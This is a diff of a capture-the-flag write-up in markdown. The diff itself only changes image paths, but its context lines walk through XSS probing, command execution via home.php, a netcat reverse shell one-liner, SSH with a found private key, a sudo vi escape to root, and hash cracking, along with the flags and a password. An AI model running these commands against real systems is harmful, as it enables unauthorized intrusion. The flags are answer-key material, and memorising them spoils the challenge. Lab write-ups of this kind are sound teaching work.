@@ -38,20 +38,20 @@ fingerprint-strings:
 
 If we go to the website, we can see a login page:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408125526.png)
+![](cybersecurity/images/Pasted%2520image%252020250408125526.png)
 
 If we submit the request to burp, we can notice that the response for this login page is weird:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408125555.png)
+![](cybersecurity/images/Pasted%2520image%252020250408125555.png)
 
 This could be vulnerable to XSS, let's try a simple payload, for example, let's try to modify it to show us the `window.origin`:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408125722.png)
+![](cybersecurity/images/Pasted%2520image%252020250408125722.png)
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408125737.png)
+![](cybersecurity/images/Pasted%2520image%252020250408125737.png)
 
 I tried getting the cookie but nothing came in, which means that an administrator may not be surveilling the web application, let's try fuzzing for example:
 
@@ -88,12 +88,12 @@ home.php                [Status: 200, Size: 569, Words: 29, Lines: 32, Duration:
 We got a `home.php` directory, let's take a look:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408131240.png)
+![](cybersecurity/images/Pasted%2520image%252020250408131240.png)
 
 We can execute commands, let's try `id` for example:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408131309.png)
+![](cybersecurity/images/Pasted%2520image%252020250408131309.png)
 
 Got command execution, let's begin exploitation.
 
@@ -112,7 +112,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 9001 >/tmp/f
 
 You can use any other reverse shell, once we send the command, we notice this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408131435.png)
+![](cybersecurity/images/Pasted%2520image%252020250408131435.png)
 
 We can begin privilege escalation.
 
@@ -133,15 +133,15 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408131704.png)
+![](cybersecurity/images/Pasted%2520image%252020250408131704.png)
 
 We can notice this at `/var/www/html`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408132425.png)
+![](cybersecurity/images/Pasted%2520image%252020250408132425.png)
 
 There's something called `key_rev_key`, if we check the strings of it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408132450.png)
+![](cybersecurity/images/Pasted%2520image%252020250408132450.png)
 
 We found a key, we can submit it as the first answer of the room:
 
@@ -152,7 +152,7 @@ We found a key, we can submit it as the first answer of the room:
 
 Now, let's proceed with our privilege escalation, we can notice an user at `/home` named `charlie`, inside of Charlie's home, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408132656.png)
+![](cybersecurity/images/Pasted%2520image%252020250408132656.png)
 
 We got a `teleport` and `teleport.pub` file, this seems like a private `RSA` key:
 
@@ -163,7 +163,7 @@ teleport: PEM RSA private key
 
 There we go, let's get the key and go into ssh as Charlie:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408132847.png)
+![](cybersecurity/images/Pasted%2520image%252020250408132847.png)
 
 We can read `user.txt` now:
 
@@ -174,11 +174,11 @@ flag{cd5509042371b34e4826e4838b522d2e}
 
 We can see this if we use `sudo -l`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133050.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133050.png)
 
 We got sudo permissions at `/usr/bin/vi`, let's check gtfobins:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133125.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133125.png)
 
 So, we can simply do this:
 
@@ -186,15 +186,15 @@ So, we can simply do this:
 sudo /usr/bin/vi -c ':!/bin/bash' /dev/null
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133155.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133155.png)
 
 There we go, we got root access, let's read `root.txt`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133322.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133322.png)
 
 There's no `root.txt`, weird, let's check the contents of the root directory:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133343.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133343.png)
 
 There's something called `root.py`, if we take a look at it, we can see this code:
 
@@ -218,7 +218,7 @@ We can simply enter the key we got from earlier:
 -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408133737.png)
+![](cybersecurity/images/Pasted%2520image%252020250408133737.png)
 
 We got the root flag:
 
@@ -230,11 +230,11 @@ flag{cec59161d338fef787fcb4e296b42124}
 
 Remember we got `ftp` enabled, if we go inside of it, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408134019.png)
+![](cybersecurity/images/Pasted%2520image%252020250408134019.png)
 
 If we get it and use steghide, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408134124.png)
+![](cybersecurity/images/Pasted%2520image%252020250408134124.png)
 
 We got something called `b64.txt`, let's decode it:
 
@@ -306,7 +306,7 @@ charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FO
 
 We got a hash, let's try to crack it using hashcat:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408140013.png)
+![](cybersecurity/images/Pasted%2520image%252020250408140013.png)
 
 Password is:
 
@@ -315,5 +315,5 @@ cn7824
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250408140034.png)
+![](cybersecurity/images/Pasted%2520image%252020250408140034.png)
 
